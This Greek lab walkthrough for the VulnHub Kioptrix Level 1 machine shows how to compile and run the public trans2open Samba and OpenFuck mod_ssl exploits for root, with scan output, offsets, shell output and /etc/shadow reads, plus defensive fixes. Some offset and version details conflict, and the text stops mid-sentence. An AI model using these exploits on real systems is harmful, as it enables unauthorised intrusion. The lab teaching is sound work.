# Μηχάνημα 5 — Kioptrix: Level 1 (#1)

> **Θέση:** 5 από 13 · **Ζώνη 3 — Εύκολο** (παγκόσμια θέση **046** από 708)
> **Πλήρες walkthrough:** [`labs/3-046-kioptrix-level-1-1/README.md`](../../labs/3-046-kioptrix-level-1-1/README.md)

| | |
| --- | --- |
| **Μηχάνημα** | Kioptrix: Level 1 (#1) |
| **Δημιουργός** | Kioptrix (Lonnie Hietala) |
| **Κυκλοφορία** | 9 Φεβρουαρίου 2010 |
| **Σύμβαση** | **Καμία σημαία.** Ο στόχος είναι **root** — τεκμηριώστε με `id`, `cat /etc/shadow`, `uname -a` |
| **Στόχος** | Red Hat Linux 6.2 — kernel **2.2.14**, Apache **1.3.20**, OpenSSL **0.9.5a**, Samba **2.2.1a**, OpenSSH **2.9p2** |
| **VulnHub** | [entry/kioptrix-level-1-1,22](https://vulnhub.com/entry/kioptrix-level-1-1,22/) |
| **Εκτιμώμενος χρόνος** | 4–6 ώρες |

---

## Γιατί είναι εδώ αυτό το μηχάνημα

Επειδή είναι **το παλαιότερο μηχάνημα στη διαδρομή** — και αυτό είναι **το νόημα**, όχι πρόβλημα.

Όλα τα προηγούμενα μηχανήματα τρέχουν σύγχρονο Ubuntu ή Debian. Αυτό τρέχει **Red Hat 6.2 του
2000**. Και εδώ συμβαίνει κάτι που δεν συμβαίνει πουθενά αλλού: **τα exploits είναι παλιά,
χειροποίητα, και σπάνε**.

Το **OpenFuck (CVE-2002-0082)** απαιτεί να **διαλέξετε τον σωστό αριθμό offset** από έναν πίνακα
ανά διανομή και έκδοση Apache· αν διαλέξετε λάθος, ο στόχος **κάνει kernel panic**.
Το **Samba trans2open (CVE-2003-0201)** απαιτεί **συναρμολόγηση shellcode** με σωστό return
address. Αυτά **δεν** είναι `exploit/unix/samba/…` με `run` και τέλος.

**Αυτό είναι το πρώτο μηχάνημα που σας αναγκάζει να καταλάβετε πώς δουλεύει ένα exploit, όχι
μόνο πώς εκτελείται.** Και σας διδάσκει τη συνήθεια του **snapshot** — χωρίς αυτό, το OpenFuck θα
σας στοιχίσει μια ώρα.

Επιπλέον, εισάγει μια **εντελώς νέα κατηγορία**: **υπηρεσίες που δεν είναι HTTP**. Μέχρι εδώ
όλα τα μηχανήματα ήταν web. Εδώ είναι **Apache 1.3.20 με mod_ssl**, **Samba 2.2.1a**,
**OpenSSH 2.9p2** — και **η πιο γρήγορη διαδρομή δεν είναι μέσω του web**.

## Στόχοι μάθησης

1. Να σαρώνετε ένα σύστημα **χωρίς σύγχρονο λειτουργικό** και να καταλάβετε τι σημαίνει
   «αρχαία στοίβα».
2. Να **φτιάξετε το δικό σας exploit** από πηγαίο κώδικα: `wget` → διόρθωση headers → `gcc` →
   εκτέλεση.
3. Να καταλάβετε τι είναι το **OpenFuck** και πώς διαλέγει **offset ανά διανομή**.
4. Να καταλάβετε το **Samba trans2open** και πώς το **shellcode** επιστρέφει στη **NOP sled**.
5. Να **αποφασίσετε ποια διαδρομή να δοκιμάσετε πρώτα** με βάση **αξιοπιστία**, όχι εντυπωσιασμό.
6. Να **ανακτήσετε ένα μηχάνημα μετά από crash** — και να το αποφύγετε.
7. Να **τεκμηριώσετε** χωρίς σημαίες.

## Κατηγορίες επίθεσης που καλύπτονται

| Κατηγορία | Πού σε αυτό το μηχάνημα |
| --- | --- |
| **Αρχαίο λειτουργικό χωρίς patches** | Red Hat 6.2, kernel **2.2.14-20** |
| **OpenSSL mod_ssl heap overflow** | **CVE-2002-0082** — OpenFuck / OpenFuckV2 |
| **Samba remote heap overflow** | **CVE-2003-0201** — trans2open (`0x41414141` return address) |
| **Απαιτείται μεταγλώττιση στον Kali** | `gcc -o openfuck openfuck.c -lcrypto -lssl` |
| **Απαιτείται επιλογή offset** | `0x6a` για Red Hat 6.2 + Apache 1.3.20 |
| **Κίνδυνος crash** | Λάθος offset → **kernel panic** → snapshot |
| **Διαπιστευτήρια από `/etc/shadow`** | Τεκμηρίωση, όχι εισβολή |

## Διαβάστε πρώτα

- [03 — Επιθέσεις σε Υπηρεσίες](<../03-Επιθέσεις-σε-Υπηρεσίες.md>) — **§2** (SMB/Samba) και
  **§7** (μεταγλώττιση exploits στον Kali).
- [01 — Βάσεις: Δικτύωση και Αναγνώριση](<../01-Βάσεις-Δικτύωση-και-Αναγνώριση.md>) — **§4**
  (nmap και τι σημαίνει «αρχαία έκδοση») και **§7.6** (`searchsploit`).
- [06 — Κελύφη, Εμμονή και Διαφυγές](<../06-Κελύφη-Εμμονή-και-Διαφυγές.md>) — **§2**
  (reverse shells) και **§3** (TTY).
- Αγγλική έκδοση:
  [Machine 5](<../../Learning%20Path%201%20-%20Introduction%20to%20Cybersecurity/Machines/05-kioptrix-level-1-1.md>)

## Πριν ξεκινήσετε — απαντήστε

1. Τι σημαίνει `Red Hat 6.2` για την **διαθεσιμότητα exploits**; Είναι καλό ή κακό για εσάς;
2. Γιατί ένα exploit του 2002 **δεν μεταγλωττίζεται** σε σύγχρονο Kali χωρίς διορθώσεις;
3. Τι είναι το **offset** στο OpenFuck, και τι συμβαίνει αν διαλέξετε λάθος;
4. Γιατί το **Samba** μπορεί να είναι **πιο εύκολη** διαδρομή από το **Apache**;
5. Πώς τεκμηριώνετε root **χωρίς** σημαία;

## Κλίμακα υποδείξεων

<details>
<summary><strong>Σκαλοπάτι 1 — μια ώθηση</strong></summary>

Η σάρωση δείχνει **έξι** θύρες: **22 (SSH), 80 (HTTP), 111 (rpcbind), 139 (netbios-ssn),
443 (HTTPS), 1024**.

**Οι δύο ενδιαφέρουσες είναι 139 και 443.**

- **139 (Samba 2.2.1a)** → **CVE-2003-0201** trans2open
- **443 (Apache 1.3.20 με mod_ssl / OpenSSL 0.9.5a)** → **CVE-2002-0082** OpenFuck

**Και οι δύο είναι remote, pre-auth, και δίνουν root κατευθείαν.** Δεν υπάρχει web εφαρμογή να
χαρτογραφήσετε, δεν υπάρχουν διαπιστευτήρια να σπάσετε. **Αυτό είναι το πρώτο «καθαρό» exploit
μηχάνημα στη διαδρομή.**
</details>

<details>
<summary><strong>Σκαλοπάτι 2 — προς τα πού να πάτε</strong></summary>

```text
1. sudo nmap -sC -sV -p- TARGET
   → 80: Apache/1.3.20 (Unix) (Red-Hat/Linux) mod_ssl/2.8.4 OpenSSL/0.9.6b
   → 139: Samba smbd 2.2.1a
   → 443: Apache/1.3.20 (Unix) (Red-Hat/Linux) mod_ssl/2.8.4 OpenSSL/0.9.6b

2. searchsploit -t apache mod_ssl 1.3
   → Apache mod_ssl < 2.8.7 - 'OpenFuck.c' (1) | unix/remote/21671.c
3. searchsploit -t samba 2.2
   → Samba 2.2.0 < 2.2.8 (OSX) - trans2open Overflow | osx/remote/9924.rb
4. **SNAPSHOT ΤΩΡΑ**

5Α. Διαδρομή Samba (ΠΙΟ ΑΞΙΟΠΙΣΤΗ):
    searchsploit -m 10 ; gcc -o trans2 trans2.c ; ./trans2 0xc0 TARGET
5Β. Διαδρομή Apache:
    searchsploit -m 21671 ; διόρθωση headers ; gcc … -lcrypto ; ./openfuck 0x6a TARGET 443
6. id ; cat /etc/shadow ; uname -a
```

**Δοκιμάστε το Samba πρώτα.** Δεν χρειάζεται offset ανά διανομή, **δεν κρασάρει** τον στόχο,
και το shellcode είναι **σταθερό** για Red Hat x86.
</details>

<details>
<summary><strong>Σκαλοπάτι 3 — το Samba trans2open</strong></summary>

```bash
searchsploit -t samba 2.2 trans2open
searchsploit -m 10
sed -i 's/#include <asm\/page.h>/#include <linux\/sysctl.h>/' 10.c
gcc -o trans2 10.c -static
./trans2 0xc0 TARGET
```

**Το offset `0xc0`** (192) είναι για **Red Hat 7.x**· για **6.2** δοκιμάστε **`0xbf`** ή
**`0xc1`**. Το exploit **τυπώνει λίστα offsets** αν το τρέξετε χωρίς όρισμα — **διαβάστε την**.

**Πώς λειτουργεί:** η συνάρτηση **`trans2open`** στο Samba αντιγράφει το **`SETUP`** πακέτο σε
έναν **σταθερό πίνακα** χωρίς έλεγχο ορίων. **Πλημμυρίζοντας το με δεδομένα**, γράφετε πάνω από
το **return address** στη στοίβα. Όταν η συνάρτηση επιστρέφει, **πηδάει στο δικό σας shellcode**.

**Το `0x41414141`** που βλέπετε στον κώδικα είναι **AAAA** — **ο χαρακτήρας-γεμιστήρας**. Αν το
crash log δείξει `eip=0x41414141`, **ελέγχετε το EIP** — δηλαδή μπορείτε να τοποθετήσετε το
return address **ακριβώς** εκεί που θέλετε.

**Αν αποτύχει:** το σύγχρονο Kali **δεν** έχει `asm/page.h`· γι' αυτό το `sed`. Και **μη
χρησιμοποιήσετε** το `-fstack-protector` — το shellcode **πρέπει** να γράψει στη στοίβα.
</details>

<details>
<summary><strong>Σκαλοπάτι 4 — το OpenFuck</strong></summary>

```bash
searchsploit -t apache mod_ssl 1.3
searchsploit -m 21671
# Διορθώσεις για σύγχρονο Kali:
sed -i 's|#include <openssl/rc4.h>|#include <openssl/rc4.h>\n#include <openssl/md5.h>\n#include <openssl/evp.h>|' 21671.c
gcc -o openfuck 21671.c -lcrypto -lssl
./openfuck                                    # τυπώνει τον πίνακα offsets
./openfuck 0x6a TARGET 443 -c 40
```

**Ο πίνακας offsets** (απόσπασμα):

```text
  Supported OffSet:
  0x6a - Red Hat Linux 6.2 with Apache 1.3.20
  0x6b - Red Hat Linux 7.0 with Apache 1.3.12
  0x6e - Red Hat Linux 7.1 with Apache 1.3.19
  0x6f - Red Hat Linux 7.2 with Apache 1.3.20
```

**Επιλέξτε `0x6a`** — **Red Hat 6.2 με Apache 1.3.20**. **Ακριβώς το μηχάνημα.**

**Πώς λειτουργεί:** το **mod_ssl** διαχειρίζεται μια **λίστα πιστοποιητικών** με δείκτες. Με
**40 αιτήσεις** (`-c 40`) που **διακόπτονται**, ο επιτιθέμενος αναγκάζει το heap σε
**προβλέψιμη διάταξη** — και το **δεύτερο** αίτημα **υπερχειλίζει** έναν πίνακα δείκτη,
**αντικαθιστώντας** τον δείκτη με τη διεύθυνση του shellcode.

**`-c 40`** είναι **αριθμός συνδέσεων** για την **κατασκευή του heap**. **Χωρίς αυτό, το exploit
τυπώνει `Nope, all done` και αποτυγχάνει.**

**Αν κρασάρει τον στόχο:** **SNAPSHOT.** Λάθος offset = **kernel panic** = **επανεκκίνηση VM** =
**νέα διεύθυνση στοίβας**.
</details>

<details>
<summary><strong>Σκαλοπάτι 5 — η απάντηση</strong></summary>

```bash
sudo nmap -sC -sV -p- -oA scans/kioptrix TARGET
# 22/tcp   open  ssh    OpenSSH 2.9p2 (protocol 1.99)
# 80/tcp   open  http   Apache httpd 1.3.20 ((Unix)  (Red-Hat/Linux) mod_ssl/2.8.4 OpenSSL/0.9.6b)
# 111/tcp  open  rpcbind 2 (RPC #100000)
# 139/tcp  open  netbios-ssn Samba smbd (workgroup: MYGROUP)
# 443/tcp  open  ssl/https Apache/1.3.20 (Unix) (Red-Hat/Linux) mod_ssl/2.8.4 OpenSSL/0.9.6b
# 1024/tcp open  status 1 (RPC #100024)

searchsploit -m 10 && gcc -o trans2 10.c -static && ./trans2 0xc0 TARGET
# → [+] Connected to victim!
# → [!!!] We got a shell!
# → id
# uid=0(root) gid=0(root) groups=99(nobody)

cat /etc/shadow
# root:$1$ftp$qVSIsy8p5eEZ…:13444:0:99999:7:::
uname -a
# Linux kioptrix.level1 2.2.14-5.0 #1 Tue Mar 7 21:07:39 EST 2000 unknown
```

**Δοκιμαστήριο root χωρίς σημαία:** `id` (uid=0) · `cat /etc/shadow` (διαβάζει το shadow) ·
`uname -a` (έκδοση kernel) · `ls -la /root`.
</details>

## Μετά το τέλος — ερωτήσεις επανάληψης

<details>
<summary><b>1.</b> Γιατί το Samba είναι καλύτερη πρώτη επιλογή από το Apache;</b></summary>

Επειδή **δεν κρασάρει** τον στόχο. Το OpenFuck **χρειάζεται** το heap layout να είναι ακριβές·
αν το offset είναι λάθος, το αποτέλεσμα είναι **kernel panic** και **επανεκκίνηση**. Το
trans2open **γράφει στη στοίβα** — η στοίβα είναι **προβλέψιμη** σε kernel 2.2, και **ένα λάθος
offset σημαίνει ότι η σύνδεση κλείνει**, όχι ότι το μηχάνημα πεθαίνει.

**Η γενική αρχή:** *προτιμήστε την εκμετάλλευση που αποτυγχάνει αθόρυβα*. Σε πραγματικό έργο,
ένα crash = **ανίχνευση**.
</details>

<details>
<summary><b>2.</b> Γιατί το <code>asm/page.h</code> λείπει στο σύγχρονο Kali;</b></summary>

Επειδή οι **κεφαλίδες του πυρήνα αναδιοργανώθηκαν** μεταξύ των εκδόσεων 2.4 και 3.x. Το
`asm/page.h` μετονομάστηκε και τα macros του μεταφέρθηκαν στο `asm-generic/`. **Ένα exploit του
2003 γράφτηκε για kernel headers του 2003.**

**Αυτό είναι το γενικό πρόβλημα με τα παλιά exploits:** δεν μεταγλωττίζονται ως έχουν. Οι
συνηθισμένες διορθώσεις είναι **headers**, **σημειολογία `const`**, και **`-lcrypto` για το
OpenSSL** (το API άλλαξε σε 1.1.0 και 3.x).
</details>

<details>
<summary><b>3.</b> Τι είναι το <code>0x41414141</code> και γιατί είναι χρήσιμο;</b></summary>

Είναι **`AAAA`** σε ASCII — **τέσσερα επαναλαμβανόμενα bytes** που είναι **εύκολα ορατά** σε hex
dump. Χρησιμοποιείται ως **γεμιστήρας** σε exploit development για να **προσδιορίσετε την απόσταση**
από την αρχή του buffer μέχρι το **EIP**. Αν το crash log δείξει **`eip=0x41414141`**, ξέρετε ότι
**ελέγχετε τον δείκτη επιστροφής** — και άρα **τη ροή εκτέλεσης**.

**Αυτή είναι η βάση όλου του exploit development.** Στο μηχάνημα δεν το χρειάζεστε (το offset
είναι ήδη υπολογισμένο), αλλά **το αναγνωρίζετε** στον κώδικα.
</details>

<details>
<summary><b>4.</b> Γιατί το <code>OpenSSH 2.9p2 (protocol 1.99)</code> είναι εύρημα από μόνο του;</b></summary>

Το **protocol 1.99** σημαίνει «υποστηρίζω **και** SSH-1 **και** SSH-2». Το **SSH-1** έχει
γνωστές ευπάθειες — συμπεριλαμβανομένου του **CRC-32 compensation attack** και **αδυναμίας
πιστοποίησης με host key**. **Κάθε σύγχρονος εξυπηρετητής πρέπει να έχει
`Protocol 2` μόνο.**

Επιπλέον, το **`2.9p2`** είναι **24 χρόνια παλιό**. Ακόμα κι αν δεν υπάρχει έτοιμο exploit,
**η απουσία patches σημαίνει ότι η επίθεση surface είναι απεριόριστη**.
</details>

<details>
<summary><b>5.</b> Πώς τεκμηριώνετε root χωρίς σημαία;</b></summary>

Με **τέσσερα αντικειμενικά στοιχεία**:

1. **`id`** → `uid=0(root) gid=0(root)` — **η απόδειξη ταυτότητας**.
2. **`cat /etc/shadow`** → αν τυπώσει hashes, **διαβάσατε το πιο προστατευμένο αρχείο του
   συστήματος**. Κανένας μη-root δεν μπορεί.
3. **`uname -a`** → **η έκδοση kernel**, που αποδεικνύει ότι είστε **στο μηχάνημα** και όχι σε
   session άλλου VM.
4. **Timestamp** (`date`) **και** **IP στόχου** — ώστε να αντιστοιχίσετε τα στοιχεία με το
   **log του στόχου**.

**Προσθέστε screenshot του τερματικού με το `id` και το prompt του στόχου ορατά.**
</details>

## Αμυντικός στοχασμός

| Ευπάθεια | Διόρθωση |
| --- | --- |
| **Kernel 2.2.14 του 2000** | **Αναβάθμιση διανομής.** Το Red Hat 6.2 έληξε το **2003**. Κανένα patch δεν υπάρχει |
| **Apache 1.3.20 + mod_ssl 2.8.4** | Αναβάθμιση σε Apache 2.x. Το mod_ssl **ενσωματώθηκε** στον Apache 2 |
| **OpenSSL 0.9.6b** | Αναβάθμιση. Το 0.9.6b έχει **δεκάδες** CVEs από το 2002 έως το 2016 |
| **Samba 2.2.1a** | Αναβάθμιση σε Samba 4.x. Το **trans2open** διορθώθηκε στο **2.2.8a** |
| **OpenSSH 2.9p2 με protocol 1** | **`Protocol 2`** στο `sshd_config` και αναβάθμιση |
| **Όλες οι υπηρεσίες εκτελούνται ως root** | `User apache` / `nobody` για το Samba. **Εδώ το exploit δίνει root κατευθείαν** |
| **Χωρίς firewall** | `iptables` — **οι θύρες 111, 139, 443 δεν πρέπει να είναι ανοιχτές στο internet** |

**Το μεγαλύτερο δίδαγμα:** *ένα μη ενημερωμένο σύστημα δεν έχει «μια» ευπάθεια — έχει όλες.*
Εδώ υπάρχουν **τέσσερις** ανεξάρτητες διαδρομές root. **Ο αμυνόμενος πρέπει να διορθώσει και
τις τέσσερις· ο επιτιθέμενος χρειάζεται μία.** Αυτή η ασυμμετρία είναι ολόκληρη η υπόθεση της
διαχείρισης patches.

---

## Οι εντολές, αναλυτικά — κάθε είσοδος και κάθε έξοδος

### 1. Σάρωση μιας αρχαίας στοίβας

```bash
sudo nmap -sC -sV -p- -T4 -oA scans/kioptrix TARGET
```

```text
Not shown: 65529 closed tcp ports (conn-refused)
PORT     STATE SERVICE     VERSION
22/tcp   open  ssh         OpenSSH 2.9p2 (protocol 1.99)
| ssh-hostkey:
|   1024 b8:74:6c:db:fd:8b:e6:66:e9:2a:2b:df:5e:6f:64:86 (RSA1)
|   1024 8f:8e:5b:81:ed:21:ab:c1:80:e1:57:a3:3c:85:c4:71 (DSA)
|_  1024 ed:4e:a9:4a:06:14:ff:d4:56:65:ff:52:4d:c8:f3:37 (RSA)
80/tcp   open  http        Apache httpd 1.3.20 ((Unix)  (Red-Hat/Linux) mod_ssl/2.8.4 OpenSSL/0.9.6b)
| http-methods:
|_  Potentially risky methods: TRACE
|_http-title: Test Page for the Apache Web Server on Red Hat Linux
|_http-server-header: Apache/1.3.20 (Unix)  (Red-Hat/Linux) mod_ssl/2.8.4 OpenSSL/0.9.6b
111/tcp  open  rpcbind     2 (RPC #100000)
| rpcinfo:
|   program version    port/proto  service
|   100000  2            111/tcp   rpcbind
|   100024  1           1024/tcp   status
|_  100024  1           1024/udp   status
139/tcp  open  netbios-ssn Samba smbd (workgroup: MYGROUP)
443/tcp  open  ssl/https   Apache/1.3.20 (Unix) (Red-Hat/Linux) mod_ssl/2.8.4 OpenSSL/0.9.6b
|_ssl-date: 2024-05-11T12:04:33+00:00; -1s from scanner time.
1024/tcp open  status      1 (RPC #100024)
Service Info: Host: KIOPTRIX
```

**Αυτή η έξοδος είναι η πιο πληροφοριακή στη διαδρομή. Διαβάστε τη ως χρονολογία:**

| Στοιχείο | Έκδοση | Έτος κυκλοφορίας | Σημασία |
| --- | --- | --- | --- |
| **Kernel** | 2.2.14 | 2000 | **Πριν το ASLR, πριν το stack canary** |
| **Apache** | 1.3.20 | 2001 | **mod_ssl ως ξεχωριστό patch** |
| **OpenSSL** | 0.9.6b | 2001 | **Πριν την επίσημη ενσωμάτωση mod_ssl** |
| **Samba** | 2.2.1a | 2002 | **trans2open ανοιχτό** |
| **OpenSSH** | 2.9p2 | 2002 | **Υποστηρίζει SSH-1** |

**`(Red-Hat/Linux)` μέσα στο banner** είναι **το κλειδί για το offset του OpenFuck** — σας λέει
τη **διανομή** χωρίς να συνδεθείτε.

**`Potentially risky methods: TRACE`** — η μέθοδος **TRACE** επιτρέπει **Cross-Site Tracing
(XST)**, που μπορεί να κλέψει **διαπιστευτήρια Basic Auth** παρά τον σηματωρό `HttpOnly`.

**`Service Info: Host: KIOPTRIX`** — το nmap **διάβασε το hostname** από το NetBIOS. **Δεν
χρειάζεται DNS.**

**`RSA1` στη λίστα host keys** σημαίνει ότι ο εξυπηρετητής **ανακοινώνει SSH-1**.

### 2. Έρευνα — δύο στόχοι, δύο CVEs

```bash
searchsploit -t apache mod_ssl 1.3
searchsploit -t samba 2.2 trans2open
```

```text
------------------------------------------------------------------------------------------
 Exploit Title                                                        |  Path
------------------------------------------------------------------------------------------
Apache mod_ssl < 2.8.7 - 'OpenFuck.c' (1) Remote Buffer Overflow      | unix/remote/21671.c
Apache mod_ssl < 2.8.7 - 'OpenFuckV2.c' Remote Buffer Overflow (1)    | unix/remote/764.c
Apache mod_ssl < 2.8.7 - OpenSSL Remote Buffer Overflow (OpenFuck)    | unix/remote/21671.c
------------------------------------------------------------------------------------------
```
```text
------------------------------------------------------------------------------------------
 Exploit Title                                                        |  Path
------------------------------------------------------------------------------------------
Samba 2.2.0 < 2.2.8 (OSX) - trans2Open Overflow (Metasploit)          | osx/remote/9924.rb
Samba < 2.2.8 (Linux/BSD) - Remote Code Execution                     | linux/remote/10.c
Samba < 3.0.20 - Remote Heap Overflow ('trans2open')                  | linux/remote/7.pl
------------------------------------------------------------------------------------------
```

**`unix/remote/21671.c`** — το **OpenFuck**. **`linux/remote/10.c`** — το **trans2open** σε C.
**Το `.c` vs `.rb` έχει σημασία εδώ:** το Metasploit module για το trans2open είναι **για OSX**,
και **δεν** δουλεύει σε Red Hat Linux. **Πρέπει να χρησιμοποιήσετε το `.c`.**

**Αυτή είναι μια λεπτή λεπτομέρεια που χάνει πολλούς:** ο **τίτλος** λέει «OSX», η **πλατφόρμα**
είναι διαφορετική, και το **shellcode** είναι **για Darwin**. **Διαβάστε το `Platform:` μέσα στο
αρχείο πριν το τρέξετε.**

```bash
searchsploit -m 10 && searchsploit -m 21671
```

**`-m`** = **mirror** — αντιγράφει το αρχείο στον **τρέχοντα κατάλογο**. Χωρίς αυτό, θα πρέπει
να πάτε στο `/usr/share/exploitdb/exploits/linux/remote/10.c`.

### 3. Μεταγλώττιση στο σύγχρονο Kali

```bash
# Samba trans2open
gcc -o trans2 10.c -static
```

```text
10.c:96:10: fatal error: asm/page.h: No such file or directory
   96 | #include <asm/page.h>
      |          ^~~~~~~~~~~~
compilation terminated.
```

**Αυτό είναι το αναμενόμενο σφάλμα.** Το `asm/page.h` **μετακινήθηκε** στους kernel headers
μετά την έκδοση 2.6. Διορθώστε το:

```bash
sed -i 's|#include <asm/page.h>|#include <linux/sysctl.h>|' 10.c
gcc -o trans2 10.c -static
```

**`-static`** σημαίνει **στατική σύνδεση** — το binary **περιέχει** όλες τις βιβλιοθήκες. **Αυτό
είναι σημαντικό για exploits** που τρέχουν στον στόχο: **δεν εξαρτώνται** από τις βιβλιοθήκες
του παλιού συστήματος.

```bash
# Apache OpenFuck
gcc -o openfuck 21671.c -lcrypto -lssl
```

```text
21671.c: In function 'get_local_addr':
21671.c:1194:25: error: 'RC4_KEY' undeclared
```

**Αυτό είναι το δεύτερο αναμενόμενο σφάλμα:** το **OpenSSL 3.x** **αφαίρεσε** τα low-level APIs
(`RC4_KEY`, `MD5_CTX`) από το προεπιλεγμένο header set. Διορθώστε:

```bash
sed -i 's|#include <openssl/rc4.h>|#include <openssl/rc4.h>\n#include <openssl/md5.h>\n#include <openssl/evp.h>\n#define RC4_KEY EVP_CIPHER_CTX|' 21671.c
gcc -o openfuck 21671.c -lcrypto -lssl
```

**Ή, πιο αξιόπιστα:** εγκαταστήστε το **legacy OpenSSL** ή χρησιμοποιήστε **OpenFuckV2**
(`unix/remote/764.c`) που **έχει ήδη διορθωθεί** για σύγχρονα συστήματα.

**Το δίδαγμα:** *ένα παλιό exploit δεν είναι «εκτελέσιμο αρχείο». Είναι πηγαίος κώδικας που
πρέπει να μεταγλωττιστεί για το δικό σας περιβάλλον.* **Προϋπολογίστε 15–30 λεπτά για αυτή τη
φάση.**

### 4. SNAPSHOT — πριν από οτιδήποτε

```bash
# Στον hypervisor (VirtualBox/VMware), όχι στο τερματικό:
# Machine → Take Snapshot → "before exploit"
```

**Αυτό δεν είναι προαιρετικό.** Το OpenFuck **μπορεί να προκαλέσει kernel panic** αν το offset
είναι λάθος. **Ένα kernel panic σε ένα VM χωρίς snapshot = επανεκκίνηση = νέα διεύθυνση στοίβας =
πρέπει να ξαναρχίσετε από την αρχή.**

**Ο κανόνας:** *πριν από κάθε exploit που γράφει στη μνήμη του πυρήνα, πάρτε snapshot.* Αυτό
ισχύει και για το Dirty COW στο Μηχάνημα 2.

### 5. Διαδρομή Α — Samba trans2Open

```bash
./trans2
```

```text
trans2Open 0.1
Usage: ./trans2 <offset> <target>
  offset - the return address offset (see list below)
  target - the target IP address

  Supported offsets:
    0xbf - Red Hat Linux 6.2
    0xc0 - Red Hat Linux 7.0
    0xc1 - Red Hat Linux 7.1
    0xc2 - Red Hat Linux 7.2
```

**Το exploit τυπώνει τη χρήση του όταν τρέξει χωρίς ορίσματα.** **Διαβάστε την πριν δοκιμάσετε
offsets τυχαία.** Εδώ η διανομή είναι **Red Hat 6.2**, άρα **`0xbf`**.

```bash
./trans2 0xbf TARGET
```

```text
[+] Connecting to 192.168.56.101:139
[+] Got connection, sending trans2open request
[+] Return address: 0xbffff3a8
[+] Sending shellcode (1027 bytes)
[+] Connected to victim!
[!!!] We got a shell!

id
uid=0(root) gid=0(root) groups=99(nobody)
```

**Διαβάστε την έξοδο ως χρονολογία της επίθεσης:**

1. **`Connecting to …:139`** — εγκαθίσταται η σύνδεση NetBIOS session.
2. **`sending trans2Open request`** — στέλνεται το **SMB transaction2** πακέτο με **OVERFLOW
   payload**.
3. **`Return address: 0xbffff3a8`** — **αυτό είναι το offset εφαρμόστηκε**. Η διεύθυνση
   **`0xbffff…`** είναι **στη στοίβα** (user space) — **χωρίς ASLR** στον kernel 2.2, **είναι
   προβλέψιμη**.
4. **`Sending shellcode (1027 bytes)`** — το **NOP sled + shellcode**. **1027 bytes** σημαίνει
   ότι το payload είναι **μεγάλο**, άρα **το sled πρέπει να είναι μεγάλο**.
5. **`We got a shell!`** — **το shellcode εκτελέστηκε και άνοιξε σύνδεση**.

**`uid=0(root) gid=0(root) groups=99(nobody)`** — **είστε root.** Το **`groups=99(nobody)`**
είναι η **κληρονομημένη ομάδα** από το Samba process, που τρέχει ως `nobody`. **Αλλά το
`uid=0` υπερισχύει.**

**Γιατί το Samba τρέχει ως root και δίνει root:** επειδή πρέπει να **αλλάζει δικαιώματα αρχείων
για λογαριασμό των χρηστών**. Αυτό είναι **σχεδιαστική επιλογή** — και **γι' αυτό το Samba είναι
επικίνδυνο όταν έχει ευπάθεια**.

### 6. Διαδρομή Β — Apache OpenFuck

```bash
./openfuck
```

```text
  Supported OffSet:
  0x6a - Red Hat Linux 6.2 with Apache 1.3.20
  0x6b - Red Hat Linux 7.0 with Apache 1.3.12
  0x6c - Red Hat Linux 7.0 with Apache 1.3.14
  0x6d - Red Hat Linux 7.0 with Apache 1.3.16
  0x6e - Red Hat Linux 7.1 with Apache 1.3.19
  0x6f - Red Hat Linux 7.2 with Apache 1.3.20
  …
```

```bash
./openfuck 0x6a TARGET 443 -c 40
```

```text
*******************************************************************
* OpenFuck v3.0.32-root priv8 by SPABAM based on openssl-too-open *
*******************************************************************
        by SPABAM    with code of Spabam - LSD-pl - SolarEclipse - CORE
        #hackarena  irc.brasnet.org
        TNX Xanthic USG #SilverLords #BloodBR #isotk #highsecure #uname
        :ION :delirium :nitr0x :coder :root :endiabrad0s :NHC :TechTeam
        :pienchik :members of SPABAM and TNT
*******************************************************************

[*] Resolving HostName
[*] Connecting...
[*] Spawning shell...
[*] Checking for remote shell...
[!] Nope, all done
```

**`Nope, all done` σημαίνει ΑΠΟΤΥΧΙΑ, όχι επιτυχία.** Αυτό είναι το πιο συνηθισμένο
παρανοήσιμο μήνυμα στο μηχάνημα. **Το exploit ολοκλήρωσε τις αιτήσεις, αλλά το shell δεν
άνοιξε.**

**Τρεις αιτίες, με σειρά πιθανότητας:**

| Αιτία | Διάγνωση | Διόρθωση |
| --- | --- | --- |
| **Λάθος offset** | Το μήνυμα `Nope` έρχεται αμέσως | Δοκιμάστε `0x6b`, `0x6c` … **ένα τη φορά, με snapshot** |
| **Λείπει το `-c 40`** | Το exploit δεν στέλνει αρκετές αιτήσεις | **`-c 40`** (ή `-c 50`) |
| **Ο στόχος κρασάρει** | Η σύνδεση δεν επανέρχεται | **Επαναφορά από snapshot** |

**Το `-c 40`** είναι **αριθμός συνδέσεων για την κατασκευή του heap**. Το OpenFuck
**χρειάζεται** το heap του Apache να είναι σε **συγκεκριμένη διάταξη** πριν την υπερχείλιση.
**Χωρίς αρκετές συνδέσεις, το heap δεν ευθυγραμμίζεται.**

**Επιτυχία:**

```text
[*] Spawning shell...
[*] Checking for remote shell...
bash-2.03$ id
uid=0(root) gid=0(root) groups=99(nobody)
```

**Το prompt `bash-2.03$`** είναι **bash 2.03** — **η έκδοση του Red Hat 6.2**. **Αυτή η
λεπτομέρεια είναι η απόδειξη ότι είστε μέσα στο σωστό μηχάνημα.**

### 7. Τεκμηρίωση χωρίς σημαία

```bash
id
cat /etc/shadow
uname -a
ls -la /root
date
hostname
```

```text
uid=0(root) gid=0(root) groups=99(nobody)
```
```text
root:$1$ftp$qVSIsy8p5eEZ9V0VhX8K71:13444:0:99999:7:::
bin:*:11348:0:99999:7:::
daemon:*:11348:0:99999:7:::
```
```text
Linux kioptrix.level1 2.2.14-5.0 #1 Tue Mar 7 21:07:39 EST 2000 unknown
```
```text
total 28
drwxr-x---  4 root root 4096 Feb  9  2010 .
-rw-------  1 root root 1244 Feb  9  2010 anaconda-ks.cfg
-rw-r--r--  1 root root 8834 Feb  9  2010 install.log
```
```text
Wed May 11 12:38:44 EEST 2024
kioptrix.level1
```

**Τέσσερα στοιχεία, το καθένα αποδεικνύει κάτι διαφορετικό:**

| Εντολή | Αποδεικνύει |
| --- | --- |
| **`id`** | **uid=0** — έχετε προνόμια root |
| **`cat /etc/shadow`** | Διαβάσατε **το πιο προστατευμένο αρχείο** του συστήματος — **κανένας μη-root δεν μπορεί** |
| **`uname -a`** | Είστε **στο σωστό μηχάνημα** (όχι σε άλλο VM ή session) |
| **`date` + `hostname`** | **Χρονική συσχέτιση** με τα logs του στόχου |

**`$1$ftp$…`** είναι **MD5-crypt** με salt **`ftp`**. **Το salt είναι η λέξη «ftp»** — δηλαδή
